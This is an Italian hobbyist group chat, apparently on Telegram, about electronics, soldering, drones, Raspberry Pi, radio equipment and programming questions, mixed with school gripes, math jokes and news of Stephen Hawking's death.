Uno mi mette 5 perché sono stato assente e non gli ho consegnato il progetto entro il termine di scadenza ma 10 minuti dopo
L'altro mi mette 2 perché non prendo appunti
io ho fatto il CAR a Maricentro
Come minimo!
Va beh sei ribelle
Che devo prendere appunti su tutti i numeri in binario progressivi? Ma siamo seri
neanche Einstein lo faceva, faceva tutto a mente, ma è stato il massimo genio del XX secolo..che cazzo di ragionamenti fa sto troglodita
Stavano facendo il decodificatore per i display a 7 segmenti
Oh, io sono strano in inglese
E dovevamo copiare sul quaderno ogni combinazione
Leggo e capisco articoli in inglese, poi nel compiti prendo 5
Tipo, ingresso 0000
sul display sono accesi i segmenti x
Con tutto che seno 2 livello trinity
Ingresso 0001, sono accesi i due di destra
Parla italiano 
Io non sono buono a prendere appunti
0002, 0003 fino a 1111
Ma non ha senso

Spiegami che senso ha appuntarsi sta roba
Poi sono 2 settimane che sta su quest'argomento
Vuole fare tutto, ls tabella con le combinazioni, la mappa di Karnaugh per semplificare, la funzione e il circuito PER OGNUNO DEI 7 SEGMENTI DEL DISPLAY
Due settimane fa è partito con il segmento a, adesso è al c
Per me nessuno ci capisce niente
Ma sicuro
Per come spiega...
quando faccio lezione al laboratorio dell'università (insegno laboratorio di impianti elettrici) i ragazzi mettono tutti il telefono oppure il registratore sulla cattedra e si memorizzano l'audio, perchè non riescono a starmi dietro poi io sono un tipo che salta spesso da argomento ad argomento..l'altro giorno una ragazza mi ha chiesto la differenza tra relè, magnetotermico e differenziale ed erano tutti li a guardare, manco fossi gesù 
Poveri li maltratti
Capisco tra magnetotermico e differenziale ma
Cazzo c'entra il relè?
Ah comunque il nostro prof di TPSEE pensa che il relè sia il temporizzatore
 perchè li usano su dei vecchi impianti di luce scala
"quello che spegne le luci delle scale dopo un minuto"
Eh ma che c'entra con gli interruttori automatici (magnetotermico e differenziale)
 ecco appunto, e vagli a spiegare che gli elettricisti dicono "relè" ma è un altro componente
E che è un relè?
Io avrei paura di farmi fare l'impianto dal mio prof che dovrebbe insegnare proprio quello
perchè parlavo dei quadri elettrici civili e ogni tanto capita che ci sia qualche temporizzatore
Anzi probabilmente non ne avrà mai fatto uno
Avrò fatto più impianti elettrici io a 16 anni che lui a 50
eccolo qui :D
Comunque a proposito di temporizzatori, ti ho detto nel residence sulla neve che temporizzatori c'erano?
Pezzi di preistoria
non oso immaginare..dei BTicino in porcellana ?
Sicuro
Non lo so, si intravedeva sulla mensola del bagno
Ti dico solo una cosa
Faceva un rumore della madonna
Che io per due anni che sono stato in quel residence ho pensato fosse la ventola
L'ultimo giorno del terzo anno (aka la settimana scorsa) ho scoperto che veniva dal temporizzatore
dovevi fargli una foto 🤔 così scoprivamo il modello.senza codice  è impossibile
Non mi ricordo se l'ho fatta, ora cerco
Rip non l'ho fatta
Comunque manco su Google lo trovo per quanto era vecchio
Comunque era un fregno nero con un "orologio" analogico dentro abbastanza grosso
E dietro ovviamente aveva non pochi cavi volanti
Non è una cosa buona
L'anno prossimo se me lo ricordi te la faccio, tanto ormai mi sono affezionato a quel posto e ci torno ogni anno
🤔sembra un vecchio orologio temporizzato da come lo descrivi
Era un po' più grosso di questo
e ma se mi chiedono sempre che devo fare appena vedono una foto chiedono di ogni componente..l'altro giorno ho portato un mini quadro elettrico e gliel'ho fatto smontare interamente
E serve a tenere accesa una lampada infrarossi per 5 minuti da quando premi un pulsante per scaldare il bagno
Che poi il riscaldamento del bagno con la lampada a infrarossi 
un vecchio timer analogico, non li fanno più..adesso fanno quelli con la spina 16A che vanno direttamente in presa..ne ho uno, ti faccio la foto
Poi quello faceva un rumore della Madonna
E poi boh Spotify mi propone un pezzo di De Andrè
Mai provato a parlare più lentamente o a seguire un filo logico? 
lo faccio, ma essendo ingegnerandi che non hanno mai smontato una presa elettrica in vita loro, sembra di essere all'asilo.. "prof, quello cos'è? a cosa serve?" "questo va bene per pilotare i 16A?"
 questo è un timer moderno
Lo uso
Sicuro che sono ingegnerandi?
Ma cosa ancor più importante.....quella tastiera meccanica?
Non viene chiamato temporizzatore?
io ne uso tantissimi, specialmente con le vecchiette che vogliono far partire le lavatrici quando sono fuori casa 
Ahahahahahah
Che stronzata
è la mia Aukey con tasti personalizzati 26€ su Amazon, ottima
Ne ho pure alcuni di questi
non hai idea di quante ne ho viste..c'è un signore che li usa per la serra, perchè alcuni tipi di piante hanno innaffiatura e irraggiamento personalizzati, con orari differenti
Interessante.....ma se vedi nello store UK le tastiere meccaniche costano 10£ 
ma niente layout ITA
Chissene, possiamo sempre imparare
questo è un temporizzatore, il classico FInder della luce scala
Sono andato a cercare quello di mio padre ma non l'ho trovato, poi chiedo a lui dice l'ha messo senza fretta casini
Questo mi è nuovo
Oggi stavo per comprare un relè normale e uno a stato solido
🤔per farci?
li trovi in ogni impianto di luce scala
sono come i BTicino Magic, una piaga
Smanettare con Arduino, per spegnere una luce
 ottimo
Anche se ad Arduino sono interessato relativamente
No, alla fine non ho preso nessuno dei due 
beh, per la microelettronica è parecchio utile..certo, se sei come me, che il componente più piccolo è un filtro per antenna UHF che pesa 10-20 chili, la cosa cambia
Ahahahah
No, è proprio il settore
per farti capire :D
sono dei filtri a cavità per ponti radio
Ma te stai male 
 questi li usiamo sui ponti radio in montagna, attenuano fino a 90 dB
X2
E costano un rene
Quantifica
Quanto valore dai al tuo rene?
Questi sono per la banda dei 70cm giusto?
Il mio è in perfette condizioni, ed è giovane, quanto vale secondo te?
Forse troppo poco rispetto al valore sul mercato nero
🤫🤫🤫
Prova a cercare su internet. Comunque se non ricordo male costavano dai 700€ in su quelli per i 2m.
mi pare di si..non ho le foto di quelli che montiamo noi, ma dovrebbero essere simili
Troppo poco
Voglio di più
Ahhh
Pensavo il rene 

dai 700 ai 1000 € ad unità
Non stiamo più parlando di reni giusto?
Yes

Per sicurezza oh 
Che poi quei filtri costano cosí tanto non per i materiali o per come sono fatti, ma perché vengono tarati uno ad uno in laboratorio
e se se ne stara uno è un cazzo di dito in culo, si deve sostituire e mandarlo a fare ritarare, noi non possiamo..porca miseria una volta mi è capitato di dover salire sull'Etna per sostituirne 3, più il palo dell'antenna e un trasformatore..un freddo micidiale

buonanotte ragazzi, vado a letto che sono distrutto a domani
A domani 
Notte
Ma il tizio che si doveva operare?
Buongiorno
Buongiorno
Il transistor lo usi come amplificatore??
Scommetto che ti sei svegliato subito stamattina eh?
Dimmi le frequenze della croce Rossa della mia zona
Alle 6:10 è partito il crontab e alle 6:14 ero già in piedi
Era il volume basso sennò ero alzato già 1 minuto dopo
Prima di formattare avevo "I took a pill in Ibiza" e si sentiva per tutta casa quindi correvo a spegnerla per non prenderci la cazziata dai miei
Invece stammatina con Jimmy sax era piano
da dove capisco se ho "rotto" la partizione efs?
Se metti Ruggero dei Timidi devi correre ancora di più

Ma come te ne sei accorto?
Quindi fai manutenzione sui vostri ponti radio, gestisci le selettive sui Vs Ponti ?
Domani mattina remembrance dei gojira, scatti in piedi subito
9 giorni da hobbyking
Salve vorrei fare un drone 450 sono indeciso tra motori e esc
Con 80€ di spedizione
E nulla..
Questi?
O vanno bene questi?
direi questi, gli altri penso siano troppo veloci per un 450 (presumo tu voglia riprendere)
Gente mi sto studiando da solo l'elettrotecnica,
Maledetto Kirchhoff, non sto capendo un cazzo 
Ho bisogno di aiuto
Ma se motorized ESC costano così poco non ci vogliono così tanti soldi come pare per fare un dronr
Motori ed esc*
bè devi aggiungere batteria, caricabatterie, radiocomando e ricevente e naza o simili
Il radiocomando sono molti soldi
Quasi quanto la scheda di volo
Se non badi a spese arrivi a 100€ dei due, poi aggiungici i 30€ di batteria, il telaio etc
radiocomando una 40ina la scheda penso sui 70 batteria sui 30 il caricatore 15 piu il frame 20
alla fine sei sui 200
Aiuto
Emmadonna
Ogni volta che ci passo per di là c'è coda

Il problema è qua non ci si muove e per le 2 saremmo dovuti stare a Torino

Riesci a uscire sulla statale?
Eh è un pullman, sono in camposcuola
Ah 
L'autista è sceso a fumare
Fantastico
Vabbè se è una cosa che si prevede vada per le lunghe arrivano quelli dell'Anas a farvi uscire
Almeno 28 sigarette

Il colore della strada non promette niente di buono
Ehm
Quello è il giallo
Più è scuro e più si sta fermi
E questo è il più scuro che esiste su Google

Yep
Penso che il problema più grande sia il controllore di volo.. si parla di 50 80 euro :/
esatto a mano di non fare con arduino ma perdi molto in stabilità
Google ma
Per quale logica starei andando contromano in autostrada
Ahahaha
Comunque incredibile ma vero
Secondo la mappa siamo appena usciti dalla coda
Dalle 8:30 che stavamo praticamente fermi
un errore di qualche metro a bassa velocità ci sta dai...
poi solo il pallino ha una proiezione di  tipo 10m a terra :D
SCUSATE NEL BLOG -  Arduino Tutorial #1  Non è ancora stato pubblicato
Per qualsiasi segnalazione scrivete a 
❤️
yes, anche se io principalmente mi occupo delle radio degli automezzi, della manutenzione dei droni e dei server che gestiscono i sensori geovulcanologici e marittimi..raramente faccio ponti radio e antennistica, anche se vado sempre nei sopralluoghi
Qualcuno con una casa domotica ha provato mycroft?
Ti giuro avevo letto slipknot
intenditore
le faccine stanno prendendo il sopravvento, aiut

Nomi oscurati benissimo comunque

Le foto si 
E che sarebbe?
è ironico? 
Yup 
c'ho il dito preciso 
Il risultato deve essere quattro ... E dovete usare un equazione con 5 sette
Chi lo trova vince una laurea in matematica
(7+7+7+7)
Lel
Ufffaaaaa
Kek
Googol it.
A googol times
Fa 4
Domani devo andare andare dai bambini Delle elementari e dire che cosa è emei ip etch per quattro giorni di fila
Ma perché non vieni a fare le olimpiadi della matematica con la nostra squadra? Avremmo proprio bisogno di un infiltrato che passi le risposte
Cosa sono?
A causa UNICEF
Ma non sono bravo 
Di sicuro più di noi 
La squadra è:
- due di quinta, bravini
- uno di quarta
- io che sono impedito
- un amico che è un mostro
- i tizi di prima, a cui lasciamo i calcoli dato che i problemi sono troppo complicati
Del tipo
"Ehi, tu sei di prima? Fammi radice di tre per radice di sette, che ho fretta e sono pigro"
non sono separati bienno e triennio
Nelle gare a squadre dipende
Quest'anno sì l'anno scorso ce ne erano alcuni di prima sparsi per le squadre, ma penso per  carenza di elementi
Mii..potrei aggiungere...giusto per dimostrare di non sapere un cazzo manco io con te :D
Se vieni il lunedì pomeriggio a fare matematica si
K
Oh dio mio
Questa battuta è più squallida della lunghezza di una retta
Quindi quanto le cifre dopo la virgola di π?
Sono infinite
È proprio una battuta irrazionale
Appunto
Anche la lunghezza di una retta eh
«Quindi 2» cit
Anche il volume di uno spazio vettoriale R3, o il limite di tg(x) per x tendente a pi/2, etc.
Nella matematica ci sono una moltotudine di casi in cui compare l'infinito
Anche l'area di un'iperbole..yee...perchè caxxo qui non passano gli autobus, o sono in ritardo di 40 minuti...io piango, e poi mi dicono che ci sono sempre, fac
Anche i numeri rappresentabili in C in un intervallo finito
Di dove sei??
Veneto..provincia di vicenza
Dio mio
Ah anchio Veneto... provincia di Treviso
Bellissima
Anche i numeri tra 0 e 1
che è un intervallo finito per l'appunto
Rigorosamente non interi
Ecco
∞ alla base di tutto
teorema della densità in R e in C
Ma ∞ + 1
= ∞?
E ∞/∞ = 1 o ∞
Forma indeterminata
Cicca saprà rispondere
Non fa ne 1 ne infinito
∞/∞ = 1 perchè i due ∞ si semplificano
Magari
Ma wtf
Troppo semplice così
nop, forma indeterminata
Ma è più infinito l'infinito di N o l'infinito di R?
In quanto tempo verrò bannato?
infinito non appartiene ne ad N ne ad R. Infinito non è un numero vero e proprio
quando scopriranno che trolli
Qualcuno mi aiuta?
Ma se consideri infinito la quantità di numeri in N e in R qual è maggiore?
secondo il teorema della densità dei numeri, in R ci sono piu numeri che in N, ma sono comunque infiniti (anche se R è un infinito di un ordine superiore)
Comunque è forma indeterminata, bravo chi l'ha detto
È urgente
analisi 1 non la ho passata, ma queste cose le so
Olèe
Un altro candidato nella nostra squadra non così legale
Anche 7-7+7-7+7-3, non ti dice che devi usare solo 7
Ho fatto verifica dei limiti oggi ahaha
Dovrebbe uscire 0 sul display... Qualcuno mi sa aiutare?
Mmm l'avevo preso come sottointeso il "solo"
Allora si
romboli selvatico in bici? 
Yup
 
Qualcuno mi può aiutare con l'sn74ls47n?
Anche tu devi fare questo?
Si ma non funziona...
GRAZIE
Vi lancio una sfida: indovinate cosa è e a cosa serve
Fare le foto stabilizzate dal cellulare e con scatto da remoto?
 ?
Vicino
Adesso vi mando un indizio
Indizio: da acceso fa così
Autoscatto con arduino?
Raga sto comprando il raspberry pi 3
Ma ho una domanda
Praticamente vorrei usare il rasp come pc  portatile
Ma non trovo un "case" che possa farlo
timelapse da remoto con telefono
Non da remoto ma ci siamo
Bravo
Basta che compri uno schermo da 7” e lo metti sopra
☺️
Ma non riesci ad usarlo decentemente per navigare o fare ste cose
Vorrei che fosse proprio come un pc portatile
Non so se mi sono spiegato bene
Ah lol, devi costruirtelo tu ma non è abbastanza potente da essere usato come PC
Almeno che stai sulla TTY senza de
Si lo so che non e abbastanza potente ma per l' uso che ne devo fare va bene
Senza stampante 3d è possibile costruirselo
Grazie
Cartone, colla vinilica e giornali: questo è Art Attack!

Eh  a sto punto mi prendo un portatile
Da Quanto?
Non è il pi top
Ah
Ma non conviene
Ci stanno i portatili cinesi a 150 euro
Forse anche meno
Eh, ha uno schermo, mouse, tastiera, raspberry pi ed altro
E grazie telecom, in 20 minuti internet si è disconnesso 6 (sei) volte
Lo so infatti non dico nulla magari il prezzo è giusto però mi sa che mi viene un pc portatile di fascia bassa
Forse devo ricordare al modem che l'ultima volta che mi sono incazzato di brutto (si era disconnesso durante il Google I/O, lo stronzo) sono volati pezzi fino in cucina
E poi partì, quella volta
E non si fermò per un pezzo
Scusa però lo sai che ci sono delle app che lo fanno?
Raga qualcuno sa il c++?
tutti
scherzo
Come no, ci ho passato sopra dei mesi ma nessuna mi soddisfaceva quanto la fotocamera stock del mio Xperia ahah
Livello base
Why??
Mi aiuti
Un po' pure io
Non riesco a capire una linea di codice
int myArr[5]; 
 
for(int x=0; x<5; x++) { 
  myArr[x] = 42; 
}
Crea un array ed a ogni posizione dell'array mette 42
Solo?
Dai a tutti le "caselle" di myarray il valore 42
Si
Ok grazie mille
Ah ok scusa
Io ho fatto la stessa cosa con una reflex
E chiaramente la risposta è 42 no? 
 e 

Seeempre e comunque
Ah no scusa ho capito ora la battuta ahah
È roba composta da atomi, non serve a un cazzo.
Yea raghi sono a casa
anche io ho questi problemi
sempre con telecom
Wow
qualcuno di voi conosce kena mobile?
e dopo questa......
Raga ma se collego un Arduino a un cavo otg poi posso caricargli il codice tramite telefono ?
Se hai un po' di dindini ti consiglio il pi-top
È un casea puoi farci un sacco di cose
Se ti interessa, qui ti lascio il link 

in teoria sì, non sono sicurissimo ma ci sono app che lo fanno
Si
Mi sembra che pure su twotter qualcuno glielo abbia scritto e lui ha risposto direttamente con un "shit, now everyonr knows" o qualcosa del genere
Si, Arduino Droid
Buongiorno a tutti
Buongiorno
Si
Se vuoi ti invio il link per l'app
Appena hai 5 minuti magari 
Ma come timelapse
 Non è il touch 2K ma l'LCD sotto la vasca

 ‎€4‎93‎.0‎5 ‎in‎ve‎ce‎ c‎he‎ €‎67‎9.‎49
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 2‎7.‎44%
 Store: Banggood

Le stampanti a resina sono silenziose e soprattutto PRECISISSIME: vengono anche usate per creare gioielli o oggetti piccoli dalla geometria super complessa

 

Ah hahaha lol

Cazzo c'ha in testa, sto qua?
una parrucca bionda penso
comunque a parte gli scherzi bo sembra che voglia separare l'America dal resto del mondo
"se i singaporesi comprano l'azienda di processori americana potrebbero causare problemi di sicurezza alla nostra nazione"

Arrivato il raspberry pi3 da 23 euro ❤️ Grazie 
 per il codice sconto di un mese fa!
Haha dobbiamo beccarne qualcun altro
Me ne serve almeno un altro u.u
foto ogni tot secondi > le unisci > timelapse
Ahh
Che lol
Ma che pezzo di pirla
evitando di essere eccessivamente volgare
"Per non cadere in volgarità" è più bello
Qualcuno usa scaleway?
io fra poco 
anche 
 fra poco 
-.-
Io per tutti i bot Telegram e la mia vpn
I due euro che chiedono all'inizio li ridanno?
* e cicca
ragazzi qualcuno che sappia un minimo su Assembly? Ho un problemino, credo sia banale
Maybe
Grazie in anticipo...in pratica ho "mov rax, [numero1]" dove numero1 è "numero1: db 50". Il problema è che quando ispeziono i registri con gdb mi dice che in rax c'è il valore 6194, ma io ho messo 50. Ho provato a mettere "numero1: db 51" e questa volta mi esce che rax è 6195.
Ok no potrebbe essere un po troppo. Dopo lezione ci penso, magari manda il codice
va bene. Lo mando in chat o tramite pastebin?
Pastebin tutta la vita
okok
letta ieri..ancora sto ridendo
Qualche torinese qui?
Salve a tutti vorrei chiedervi un parere , dopo aver stressato il mio p9 lite , l'assistenza in cui lo ho inviato mi ha rinviato un prodotto la cui MB era downcloccata , per questo ho provato in sacco di rom per velocizzare , " perché fare i Force update di Huawei me lo hanno fatto brikkare " ho comprato il meizu pro 6 plus in mega sconto a 312€
Che ve ne pare
poi guardo
va benissimo
Se posso chiedere cosa ci fai con una VPN self-hosted?
Evito di farmi intercettare le password quando uso la WiFi dell'Università
What?
Perché lo fanno?
non è che lo fanno, ma essendo una wifi pubblica ci potrebbe essere uno che si mette a farlo
No 2k è la risoluzione xy ahhaha non del display
Finalmente arrivata 

Ora però non so dove imparare gli script per rubber ducky
No ok
Trovato
Dalla cina
(Amazon)
Mi domandavo a cosa servisse questo
Si chiama succhi stagno, serve e rimuovere lo stagno
Fiiiigo
Come funziona?
Saldi
E mentre è ancora caldo
Io non lo ho, ma credo che tu debba tirare quello stantuffo e lui aspiri
Aspiri lo stagno con quel coso
Yesss
spingi lo stantuffo per caricare, poi si preme il pulsantino nero per aspirare lo stagno fuso
Riuscito a caricarlo?
Si usa così?
Utilità? Per pulire dallo stagno in eccesso?
se devi dissaldare o togliere stagno in eccesso
Si
Grazie
Insieme ho ricevuto anche queste
Però non so come si montano 
wow, kit completo di punte per saldatore
Queste mi sono nuove
Per pulire la punta ho usato dello scottex
Va bene o no?
nella parte metallica del saldatore, vicino al manico, c'è una parte zigrinata: svitala e si toglierà un cilindro di metallo. A quel punto puoi prendere la punta e sfilarla per poi inserire quella che ti serve
ogni lavoro ha bisogno della sua punta, anche se le piu importanti sono la punta conica, la punta a spatola e la punta a spillo
Questa?
Solo che ad andare avanti ho paura di romperlo
c'è un anello metallico zigrinato, svitalo
Non si muove
Ora si
Quanto cazzo è bello quel colore 
È un grigiobluviola
Quella con la punta piccola serve per lavori di precisione vero?
punta a spillo per smd, punta conica per pmd
Pmd e SMD che significa
surface mounting device, in sigla SMD
quelli che io chiamo pmd wikipedia lo chiama pth: Pin Through Hole
Che le componenti penetrano la PCB oppure sono saldate in superficie
Ma esiste PMD? Io la conosco e l'ho sempre sentita come THT
ci sono diversi modi per chiamarli. Gli unici che si chiamano in un solo modo sono gli smd
E se ti dicessi SMT?
Raghi
Per le temperature come mi regolo?
tra 320 e 340° se usi lega stagno-piombo
Quello rosso ok ma quello nero non riesco
Così va bene no?
Tranquilli che è sul suo appoggio
si ma ce ne vuole per farla così male
attento a non distruggerlo
Sali ancora di T se usi un classico 60/40
si va bene, scottex inumidito con un filo di acqua..e se devi pulire la punta mentre saldi usa una spugnetta in ottone
La spugna in ottone è per rimuovere i residui di carbonio, da usare solo se necessario visto che si rischia di rovinare la placcatura
E ancora meglio dello scottex è usare la spugna umida che forniscono sempre con il saldatore
lo so, visto che saldo ogni giorno io di solito uso la spugna imbevuta
Ho preferito specificare visto che c'è qualcuno alle prime armi
no ma figurati, hai fatto benissimo
io uso questa spugna della Ersa (professionale) ed è ottima per pulire la punta mentre saldi..la bagni e ci passi la punta 

 comunque se vuoi ottenere delle ottime saldature  devi comprare anche lo stagno adatto ( cambia sia la misura, sia il tipo di flussante interno, sia la temperatura di fusione) sia una buona pasta flussante
ora ti linko un video (se lo trovo) dove vengono spiegate bene le differenze tra i vari stagni
 qui Issam lo spiega veramente bene
Io di solito uso solo 2 diametri di stagno (classica lega 40-60 stagno piombo) e colofonia per facilitare saldature e proteggere i contatti da ossidazione
Io più che altro direi cambiare saldatore... Che se ne dica ma avere una T stabile è la base per una buona saldatura..
idem..60/40 e 63/37 (ma ho la stazione saldante con regolazione di temp), pasta La-Co Flux e ogni tanto la trecciola
Per iniziare quello che ha va bene, di sicuro meglio di quelli che non hanno la centralina e neanche la possibilità di regolare la temp
lo so, infatti quando mi chiedono consigli sui saldatori dico sempre di spendere quei 30€ e prendere direttamente un Weller/Ersa, anche soltanto il saldatore a puntale senza kit..tanto le punte si trovano ovunque, e hai un ottimo saldatore
Si ma di quanti gradi oscilla la T? Le regolazioni on/off non sono il massimo per la saldatura e direi proprio che quello non può avere un controllo efficace..
a quel prezzo è normale
A quel punto è meglio un saldatore con T fissa ma che tale possa definirsi... Tanto uno alle prime armi non va a saldare roba particolare
esattamente..già con un Weller da 30-40W a temp fissa il salto di qualità si vede..e poi ha delle punte fenomenali
Quoto
io già soltanto con le 2 stazioni sfioro i 900€ per non parlare poi di lente, terza mano e tutto il resto
Eheh io me ne esco con i miei 300/350€ max (mi manca ancora qualche IC quindi non so ancora dire con certezza il costo) dell'unisolder
io uso questa come principale: 
e questa come secondaria: 
ho anche una Baku e una Ersa ma li usano i colleghi sull'altro banco
Io riscaldo un cacciavite a testa piatta sul gas e poi saldo
metodo antico
Ahahhahahh no ho anche dei mitici saldatori da 5€ cinesi
io quando sono fuori sede uso questo mostriciattolo
Lo ho versione cinese di wish hahah
sui ponti radio e sulle antenne è fenomenale
Ho paura che mi esploda in mano però
🤔 lo so, per questo ho preferito prenderne uno buono a gas, almeno so che è garantito
Però io mica saldo tutti i giorni, per quella saldatura all'anno mica posso avere roba professionale 
no vabbè, in questo caso fai bene..io saldo almeno 2-3 ore quasi ogni giorno, non posso usare cinesoni, specie quando vado a mettere mano dentro apparecchiature costone come le CB oppure i sensori geologici
Conosci qualche frequenza interessante zona Terracina/Fondi?
Consigli su dove prendere lo stilo (cerco il T210)? Per ora mi sono guardato i soliti tme, ecc
Provincia di Latina
delle CB? no, non mi occupo del settaggio frequenze, io faccio manutenzione..e poi le nostre sono frequenze criptate, sono come quelle delle Polizia/Carabinieri ecc.
è quello JBC?
  oppure sullo store JBC 
ottima stazione cmq ottima scelta
Appena sono a casa ci do un'occhiata grazie. Fino all'altro giorno su tme stava a 74€ ivato mi sembra, se riesco a risparmiare qualcosa...
su Maxder dovrebbe essere intorno ai 50€ più
più o meno
io sapevo che trasmettono in chiaro infatti i vv.ff. di perugia riesco a sentirli tranquillamente
se vuoi ti mando la freq in privato e il server sdr che uso per ascoltarli
50 + iva 
Raga ide con compilatore per c++?
(windows)
Su windows probabilmente il meglio è visual studio
Ma è a pagamento?
Se usi la versione community no
Differenze?
Non hai le cose a pagamento, ma non sono estremamente necessarie
Ok
Comunque io continueró a dire che programmare su linux è molto molto piu semplice e facile
Goto 
goto è uno dei comandi del c/c++ che piu vanno evitati, alcuni grossi nomi del gruppo confermeranno di sicuro
+1
why?
Ma 
Io non faccio C
Per lo stesso motivo per cui bisogna evitare di usare break (switch esclusi) e while(true)
beh...nel dubbio for(;;)
ma se non usi while(true) cosa usi scusa
Non è 
? 🤔
già
Sono stanco, permettimi errori con l'inglese
Metti una fottuta condizione di uscita come è buona usanza fare al posto di usare break
vut? no dico per fare un loop infinito, cosa usi?
io o uso while(true) oppure uso for(;;) di solito....
Unico caso, ma non deve comparire un break da nessuna parte
beh ovvio altrimenti che senso ha
nel dubbio usi i thread
Ho visto while(true) con delgi if e dei break per uscire dal ciclo...
a beh, si....ma perchè fa così male come cosa?
c'è, io lo uso qualche volta ma si potrebbero comunque usare thread o altro, ma why?
Rende poco chiaro leggere il codice e riduce le prestazioni
E questo basta e avanza come motivazione
quindi...è solo una convenzione in sostanza...
E sei fortunato, sul Python vice legge su queste convenzioni
mahonna, non farmi pensare all'indentazione che soffro
Si chiama PEP e... Sì, è abbastanza disturbante
Mi triggeri vbextreme così
Una buona abitudine che conviene rispettare, come molte delle cose contenute nelle pep di python
Da un punto di vista prettamente semantico si usa il while per l'interazioni non determinate e il for per quelle determinate. Tuttavia quasi tutti i linguaggi esistenti permettono di fare entrambe le cose con entrambi i linguaggi
Basti pensare a google che usa quelle stesse regole sia internamente che con tutte le applicazioni di terzi chebusano le loro api
beh si, credo tutti i linguaggi esistenti, essenzialmente è solo per avere un contatore o non averlo, ma è uguale, fai come preferisci
Arrivate.... quante ne hai prese?? 
Arrivate le 1060 6GB che abbiamo comprato scontatissime la settimana scorsa 
Tutte tue?
No, in realtà un po' di più

Le sto accatastando in garage, intanto
Fai bene.
Ora è il momento di vendere
Non vorrei che fa la ruggine tra le ventole. E poi non girano
Il minimo indispensabile per far girare Minecraft
come il prosciutto e il TrentinGrana..più stanno a stagionare, più buoni sono 
Ma Kaspersky come fa a individuare l’ira dannoso che è nella macchina virtuale con Ubuntu ?
Come si chiamano quei piedini di plastica per attaccare pbc ad una tavoletta?
Tipo distanziatori
Quelli su cui si incastrano le schede
Una volta si diceva del vino
Troppo sbattimento il vino ahah
Ti posso fare una domanda
Ma 🤯
Si
Come lo compilo adesso il codice? 
gli zoccoletti intendi?
si ma io sono astemio
Si quelli di nylon adesivi, non li trovo su AliExpress
🤔adesivi? quali intendi? io pensavo parlassi di quelli che si saldano..mandami una foto che vediamo di trovarli
🤔 questi non li trovo..ho trovato questi: 

Li avevo visti anche io questi.. grazie lo stesso
mi dispiace non poterti aiutare..secondo me quelli che vuoi tu li vendono in qualche kit strano
già, brutta persona proprio
Ecco la casa rivoluzionaria stampata in 3D: costa 4.000 dollari e si costruisce in 24 ore | Hardware Upgrade

lo so lo so 
corri a rimediare 
se ti può consolare sono caffeinomane 

a livello del tipo che per risparmiare soldi e per avere piu caffeina si è comprato le pastiglie online?
non saprei, entrambe le angolature non sono affatto male
no no, direttamente i pacchi di cialde da 150  Caffè Mauro e Caffè Borbone
questa è migliore, la 2 è troppo schiacciata come prospettiva
Tutti mi dicono così
Vada per la 1

Domanda importantissima
Domani dovrei mettermi l'apparecchio ai denti
Nel caso di temporali con lampi posso sorridere o c'è il pericolo di morte?
🤦‍♂️
Qualcuno più esperto di me
Si per effetto elettroautoinduttivo anche se sei a distanza di 100 metri
Consigli su come migliorare quella luce sparata in alto a destra?
E raddrizza le linee almeno prima lol
Ma no
Vabbè la tengo naturale va
no filtri »»
Devi abbassare le alte luci
mmmmm 
Perché in quel punto le nuvole sono sovraesposte e bruciate
Troppa luce
Qualcuno sa dirmi se si puo fare la rubber dacky. per fare un reset android?
Noooo
Ho rifatto la postproduzione da capo ed è venuta benino
Con una didascalia suggerita dal mio prof di sistemi a quest'ora 
Cambia subito
Sei invecchiato di minimo 40anni con quella didascalia
Ahahah
Ma è un riedit de Il cielo è azzurro sopra Berlino
"andiamo a Torino Beppe!!!Andiamo a prenderci il campionato!!!" cit.
AHAHAHAH
io c'ero quel giorno, piazzato davanti al maxischermo
Io nenache quello 
Sembri vecchio comunque
Calcola ci è partito un polmone prima
Abbiamo svegliato tutto l'albergo
Gli unici romanisti a Torino
Anche tu sei composto da atomi
effetto Dzeko
eh ma io sono vecchietto..avevo 18 anni
Parecchio vecchio 
C'è chi è più vecchio però dai

Seriously?
Yea
gg
 nel video di domani ho nominato questo gruppo... Non darò il link diretto ma prepariamoci a un bello spam di ingressi in ogni caso 
speriamo
Grazie mano di non considerarmi per le segnalazioni 
 
Ah.
Prima o poi devo bannarla
Dico anche io
Però togliere il fatto che warna all'invio di contenuti da canali non autorizzati!
Oks!
BUON PI DAY GENTE
Grazie....
 grazie
Il bello è che apro Google per vedere se qualcuno ha scritto articoli sul pi day e trovo "Ryzen e EPYC con 13 falle"
Ma senza di me morite tutti
Pulizzia Kontattiiiih
Ma che  grazie
morireste* 
Raga
Il mio pacco (fedex international priority) alle 03.40 è partito da Lonate Pozzolo, secondo voi lo consegnano in giornata?
(Napoli)
Non credo
Finché arriva alla filiale e lo smistano passa tempo
È già partito da Lonate pozzolo
La filiale del tuo paese
Ah, giusto
Vabbè arriverà domani
Se è poste italiane non ci conterei
Fedex international priority
80€ di spedizione 
Buongiorno  (la mano non mi fa mandare le gif)
Le perle
Ah...
Scommetto che costa più la spedizione del pacco
Nono
In teoria ti arriva il giorno dopo o quello dopo ancora
Ah ok! 🤞🤞
A me fa cosi fedex
E abito a trento
Nono morite proprio
Allora hai comprato un tornio
Nell'acquisto 
Una stampante 3d
Meglio un tornio
cazzo ragazzi, è morto Hawking
Visto, la rimando io
Perfetto 
Io finirò per essere bannato, ne sono sicuro
Rip
Io oggi finalmente vado a scuola
Mi sono mancati quelli stronzi
Ma sentito qualcuno così felice di tornare a scuola

Non ho mai capito come faceva a parlare
Lol
Scriveva?
Da quello che ho capito aveva dei sensori che leggevano i Nervi sulla gola ed un sintetizzatore vocale
Sofisticato
Molto
Un po' mi dispiace
Era in futurama giusto?🤔
O nei griffin
Anche in tbbt
Vero
La tastiera riusciva a leggere il movimento dei suoi occhi
chebbello usare telegram web a scuola perché con internet Explorer non è bloccata la connessione
 È MORTO STEPHEN HAWKING: Cosmologo, fisico, matematico e astrofisico britannico, fra i più autorevoli e conosciuti fisici teorici al mondo, noto soprattutto per i suoi studi sui buchi neri, aveva 76 anni 

Dei siti di offerte ne hanno approfittato per consigliare film e libri
i soliti squallidi
Galeazzi mi è scaduto parecchio dopo quest'uscita
(senza tag)
ho capito, ma poteva evitare secondo me..tanto quel libro lo conoscono tutti
Neanche io apprezzo il gesto ma diffondere un po' di cultura non fa mai male
Non hanno rei i link? Va beh allora ci può anche stare
USA | In Texas hanno costruito una casa con una stampante 3D in 24 ore

qualcuno sa dirmi a che temperatura mettere il piatto riscaldato che lancasa mi si stacca anche se metto la lacca
nuovo raspberry pi
